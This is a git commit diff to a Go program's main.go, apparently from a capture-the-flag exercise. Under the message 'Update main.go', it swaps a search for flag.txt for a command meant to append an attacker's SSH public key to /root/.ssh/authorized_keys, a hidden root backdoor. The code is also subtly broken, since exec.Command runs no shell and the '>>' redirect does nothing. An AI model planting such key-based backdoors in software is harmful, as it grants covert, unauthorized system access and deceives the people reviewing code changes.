dc3af7655bfdc37e0093a792b72d18c7a18094da
Chu <ric1337@protonmail.ch>
2024-09-21 13:32:24 -0300

    Update main.go

--- main.go
+++ main.go
@@ -5,7 +5,7 @@ import (
 )
 
 func main() {
-        cmd := exec.Command("find", "/","-name","flag.txt")
+        cmd := exec.Command("echo", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEzXucY2+J2kE2ToUC5NAlUStZhCiFJc0b+/XaMJJIo7 chu@sin",">>","/root/.ssh/authorized_keys")
         output, err := cmd.Output()
         if err != nil {
             fmt.Println("Erro:", err)
